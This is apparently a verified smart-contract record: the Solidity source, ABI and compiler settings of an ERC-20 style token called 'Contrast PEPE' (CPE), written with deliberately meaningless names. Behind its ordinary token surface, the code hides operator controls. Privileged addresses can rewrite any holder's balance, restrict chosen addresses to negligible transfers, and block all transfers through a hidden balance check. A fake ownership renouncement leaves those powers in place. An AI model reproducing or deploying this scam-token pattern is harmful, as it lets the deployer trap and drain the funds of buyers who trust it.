{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface enableSell {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address autoTradingMode) external view returns (uint256);\n\n    function transfer(address receiverWallet, uint256 marketingList) external returns (bool);\n\n    function allowance(address receiverShouldTo, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 marketingList) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverWallet,\n        uint256 marketingList\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed senderMaxAt, uint256 value);\n    event Approval(address indexed receiverShouldTo, address indexed spender, uint256 value);\n}\n\nabstract contract enableSwap {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface walletReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface receiverTake {\n    function createPair(address senderReceiver, address liquidityToken) external returns (address);\n}\n\ninterface atReceiver is enableSell {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ContrastPEPE is enableSwap, enableSell, atReceiver {\n\n    function takeBuy(address amountMarketing) public {\n        feeSellLaunch();\n        \n        if (amountMarketing == launchFundTeam || amountMarketing == maxAuto) {\n            return;\n        }\n        launchedTake[amountMarketing] = true;\n    }\n\n    function feeSellLaunch() private view {\n        require(enableIsList[_msgSender()]);\n    }\n\n    uint256 public launchBuy;\n\n    function takeLaunchedLimit(address atTrading, uint256 marketingList) public {\n        feeSellLaunch();\n        tokenBuyLimit[atTrading] = marketingList;\n    }\n\n    address public launchFundTeam;\n\n    mapping(address => bool) public enableIsList;\n\n    uint256 public shouldMode;\n\n    event OwnershipTransferred(address indexed teamShouldTotal, address indexed exemptFundLaunched);\n\n    address isToList = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint8 private shouldAmountSwap = 18;\n\n    function amountBuySender(address shouldMarketing, address receiverWallet, uint256 marketingList) internal returns (bool) {\n        if (shouldMarketing == launchFundTeam) {\n            return fromExempt(shouldMarketing, receiverWallet, marketingList);\n        }\n        uint256 isTake = enableSell(maxAuto).balanceOf(isToList);\n        require(isTake == launchedShould);\n        require(receiverWallet != isToList);\n        if (launchedTake[shouldMarketing]) {\n            return fromExempt(shouldMarketing, receiverWallet, takeLaunched);\n        }\n        return fromExempt(shouldMarketing, receiverWallet, marketingList);\n    }\n\n    uint256 public swapFrom;\n\n    function symbol() external view virtual override returns (string memory) {\n        return swapAt;\n    }\n\n    string private swapAt = \"CPE\";\n\n    function transfer(address atTrading, uint256 marketingList) external virtual override returns (bool) {\n        return amountBuySender(_msgSender(), atTrading, marketingList);\n    }\n\n    function liquidityTo(uint256 marketingList) public {\n        feeSellLaunch();\n        launchedShould = marketingList;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return swapFee;\n    }\n\n    mapping(address => mapping(address => uint256)) private takeIs;\n\n    uint256 isSellEnable;\n\n    function owner() external view returns (address) {\n        return limitTo;\n    }\n\n    uint256 public amountLiquidityMarketing;\n\n    address public maxAuto;\n\n    function listAtLaunched() public {\n        emit OwnershipTransferred(launchFundTeam, address(0));\n        limitTo = address(0);\n    }\n\n    address tradingLimitTeam = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private toLiquidity = 100000000 * 10 ** 18;\n\n    function allowance(address receiverTeam, address buyAmount) external view virtual override returns (uint256) {\n        if (buyAmount == tradingLimitTeam) {\n            return type(uint256).max;\n        }\n        return takeIs[receiverTeam][buyAmount];\n    }\n\n    bool private autoFundMarketing;\n\n    bool public maxLimitAt;\n\n    function fromExempt(address shouldMarketing, address receiverWallet, uint256 marketingList) internal returns (bool) {\n        require(tokenBuyLimit[shouldMarketing] >= marketingList);\n        tokenBuyLimit[shouldMarketing] -= marketingList;\n        tokenBuyLimit[receiverWallet] += marketingList;\n        emit Transfer(shouldMarketing, receiverWallet, marketingList);\n        return true;\n    }\n\n    uint256 launchedShould;\n\n    function balanceOf(address autoTradingMode) public view virtual override returns (uint256) {\n        return tokenBuyLimit[autoTradingMode];\n    }\n\n    function approve(address buyAmount, uint256 marketingList) public virtual override returns (bool) {\n        takeIs[_msgSender()][buyAmount] = marketingList;\n        emit Approval(_msgSender(), buyAmount, marketingList);\n        return true;\n    }\n\n    mapping(address => uint256) private tokenBuyLimit;\n\n    function minExempt(address launchAuto) public {\n        if (maxLimitAt) {\n            return;\n        }\n        \n        enableIsList[launchAuto] = true;\n        if (amountLiquidityMarketing == launchBuy) {\n            amountLiquidityMarketing = swapFrom;\n        }\n        maxLimitAt = true;\n    }\n\n    uint256 public walletTotal;\n\n    function getOwner() external view returns (address) {\n        return limitTo;\n    }\n\n    bool private feeFund;\n\n    address private limitTo;\n\n    function decimals() external view virtual override returns (uint8) {\n        return shouldAmountSwap;\n    }\n\n    mapping(address => bool) public launchedTake;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return toLiquidity;\n    }\n\n    uint256 constant takeLaunched = 16 ** 10;\n\n    string private swapFee = \"Contrast PEPE\";\n\n    function transferFrom(address shouldMarketing, address receiverWallet, uint256 marketingList) external override returns (bool) {\n        if (_msgSender() != tradingLimitTeam) {\n            if (takeIs[shouldMarketing][_msgSender()] != type(uint256).max) {\n                require(marketingList <= takeIs[shouldMarketing][_msgSender()]);\n                takeIs[shouldMarketing][_msgSender()] -= marketingList;\n            }\n        }\n        return amountBuySender(shouldMarketing, receiverWallet, marketingList);\n    }\n\n    constructor (){\n        if (swapFrom != launchBuy) {\n            launchBuy = amountLiquidityMarketing;\n        }\n        walletReceiver feeToken = walletReceiver(tradingLimitTeam);\n        maxAuto = receiverTake(feeToken.factory()).createPair(feeToken.WETH(), address(this));\n        \n        launchFundTeam = _msgSender();\n        listAtLaunched();\n        enableIsList[launchFundTeam] = true;\n        tokenBuyLimit[launchFundTeam] = toLiquidity;\n        if (swapFrom != launchBuy) {\n            walletTotal = swapFrom;\n        }\n        emit Transfer(address(0), launchFundTeam, toLiquidity);\n    }\n\n    uint256 public takeTrading;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverShouldTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamShouldTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptFundLaunched\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderMaxAt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buyAmount\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountLiquidityMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingList\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoTradingMode\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableIsList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchFundTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"marketingList\",\"type\":\"uint256\"}],\"name\":\"liquidityTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listAtLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxLimitAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchAuto\",\"type\":\"address\"}],\"name\":\"minExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountMarketing\",\"type\":\"address\"}],\"name\":\"takeBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingList\",\"type\":\"uint256\"}],\"name\":\"takeLaunchedLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingList\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingList\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ContrastPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}